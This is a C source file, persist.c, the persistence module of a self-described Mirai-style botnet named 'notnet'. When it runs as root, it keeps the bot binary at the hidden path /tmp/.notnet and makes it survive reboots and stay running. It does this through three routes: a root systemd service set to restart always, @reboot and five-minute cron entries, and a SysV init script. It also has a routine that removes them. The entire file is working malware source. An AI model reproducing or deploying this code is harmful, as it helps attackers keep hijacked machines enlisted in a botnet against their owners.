/*
 * notnet - Modern Mirai-Style Botnet
 * persist.c - Persistence module (systemd, cron, SysV init)
 */
#include "persist.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

/* ── Init System Detection ────────────────────────────────── */
int detect_init_system(void) {
    int detected = 0;
    
    /* Check for systemd */
    struct stat st;
    if (stat("/run/systemd/system", &st) == 0) {
        log_info("Detected systemd");
        detected |= PERSIST_SYSTEMD;
    }
    
    /* Check for cron */
    if (access("/usr/bin/crontab", F_OK) == 0 ||
        access("/bin/crontab", F_OK) == 0) {
        log_info("Detected cron");
        detected |= PERSIST_CRON;
    }
    
    /* Check for SysV init */
    if (stat("/etc/init.d", &st) == 0) {
        log_info("Detected SysV init");
        detected |= PERSIST_SYSV;
    }
    
    return detected;
}

/* ── Get Binary Path ──────────────────────────────────────── */
int get_persist_path(char *buf, int len) {
    /* Use /tmp/.notnet as default, fallback to /var/tmp/.notnet */
    if (access("/tmp", W_OK) == 0) {
        snprintf(buf, len, "/tmp/.notnet");
    } else {
        snprintf(buf, len, "/var/tmp/.notnet");
    }
    return 0;
}

/* ── systemd Service ─────────────────────────────────────── */
int install_systemd(const char *bin_path) {
    char unit_path[256];
    snprintf(unit_path, sizeof(unit_path), "/etc/systemd/system/notnet.service");
    
    char content[512];
    snprintf(content, sizeof(content),
        "[Unit]\n"
        "Description=Notnet Bot\n"
        "After=network.target\n"
        "\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=%s\n"
        "Restart=always\n"
        "RestartSec=30\n"
        "User=root\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n",
        bin_path);
    
    FILE *f = fopen(unit_path, "w");
    if (!f) {
        log_error("systemd: cannot write %s", unit_path);
        return -1;
    }
    
    fprintf(f, "%s", content);
    fclose(f);
    
    /* Reload systemd and enable service */
    system("systemctl daemon-reload 2>/dev/null");
    system("systemctl enable notnet.service 2>/dev/null");
    system("systemctl start notnet.service 2>/dev/null");
    
    log_info("systemd: service installed at %s", unit_path);
    return 0;
}

/* ── cron Job ──────────────────────────────────────────────── */
int install_cron(const char *bin_path) {
    char cron_line[256];
    snprintf(cron_line, sizeof(cron_line),
        "@reboot %s\n"
        "*/5 * * * * %s\n",
        bin_path, bin_path);
    
    /* Add to root crontab if writable */
    FILE *f = popen("crontab -l 2>/dev/null", "r");
    char existing[4096];
    existing[0] = '\0';
    if (f) {
        fread(existing, 1, sizeof(existing) - 1, f);
        existing[sizeof(existing) - 1] = '\0';
        pclose(f);
    }
    
    /* Check if already installed */
    if (strstr(existing, bin_path)) {
        log_info("cron: already installed");
        return 0;
    }
    
    /* Install */
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "(crontab -l 2>/dev/null; echo '%s') | crontab -",
        cron_line);
    
    int ret = system(cmd);
    if (ret == 0) {
        log_info("cron: job installed");
    }
    
    return ret;
}

/* ── SysV Init Script ────────────────────────────────────── */
int install_sysv(const char *bin_path) {
    char script_path[256];
    snprintf(script_path, sizeof(script_path), "/etc/init.d/notnet");
    
    char content[512];
    snprintf(content, sizeof(content),
        "#!/bin/sh\n"
        "# Notnet Bot\n"
        "# Description: Notnet botnet agent\n"
        "# chkconfig: 2345 99 01\n"
        "\n"
        "BIN=%s\n"
        "\n"
        "case \"$1\" in\n"
        "  start)\n"
        "    $BIN &\n"
        "    ;;\n"
        "  stop)\n"
        "    killall notnet 2>/dev/null\n"
        "    ;;\n"
        "  restart)\n"
        "    $0 stop\n"
        "    $0 start\n"
        "    ;;\n"
        "  *)\n"
        "    echo \"Usage: $0 {start|stop|restart}\"\n"
        "    exit 1\n"
        "    ;;\n"
        "esac\n"
        "exit 0\n",
        bin_path);
    
    FILE *f = fopen(script_path, "w");
    if (!f) {
        log_error("sysv: cannot write %s", script_path);
        return -1;
    }
    
    fprintf(f, "%s", content);
    fclose(f);
    
    chmod(script_path, 0755);
    
    /* Enable service */
    if (access("/usr/sbin/update-rc.d", F_OK) == 0) {
        system("update-rc.d notnet defaults 2>/dev/null");
    }
    if (access("/sbin/chkconfig", F_OK) == 0) {
        system("chkconfig --add notnet 2>/dev/null");
    }
    
    log_info("sysv: init script installed at %s", script_path);
    return 0;
}

/* ── Install Persistence ─────────────────────────────────── */
int persist_install(notnet_bot_t *bot) {
    (void)bot;  /* reserved for future use (e.g. per-bot persistence config) */
    /* SECURITY FIX (#7): Only attempt persistence as root — otherwise
     * the writes to /etc/systemd/system, /etc/init.d, and crontab will
     * fail or require dangerous sudo escalation. */
    if (geteuid() != 0) {
        log_warn("Persistence: not running as root, skipping (requires privileges)");
        return -1;
    }

    int detected = detect_init_system();
    
    char bin_path[256];
    get_persist_path(bin_path, sizeof(bin_path));
    
    /* Install to the detected init system(s) */
    if (detected & PERSIST_SYSTEMD) {
        install_systemd(bin_path);
    }
    
    if (detected & PERSIST_CRON) {
        install_cron(bin_path);
    }
    
    if (detected & PERSIST_SYSV) {
        install_sysv(bin_path);
    }
    
    log_info("Persistence: installed (systemd=%d cron=%d sysv=%d)",
             !!(detected & PERSIST_SYSTEMD),
             !!(detected & PERSIST_CRON),
             !!(detected & PERSIST_SYSV));
    
    return 0;
}

/* ── Remove Persistence ──────────────────────────────────── */
int remove_persistence(void) {
    /* systemd */
    if (access("/etc/systemd/system/notnet.service", F_OK) == 0) {
        system("systemctl disable notnet.service 2>/dev/null");
        system("systemctl stop notnet.service 2>/dev/null");
        unlink("/etc/systemd/system/notnet.service");
        system("systemctl daemon-reload 2>/dev/null");
    }
    
    /* cron */
    system("crontab -l 2>/dev/null | grep -v notnet | crontab - 2>/dev/null");
    
    /* sysv */
    if (access("/etc/init.d/notnet", F_OK) == 0) {
        system("update-rc.d -f notnet remove 2>/dev/null");
        unlink("/etc/init.d/notnet");
    }
    
    log_info("Persistence: removed");
    return 0;
}
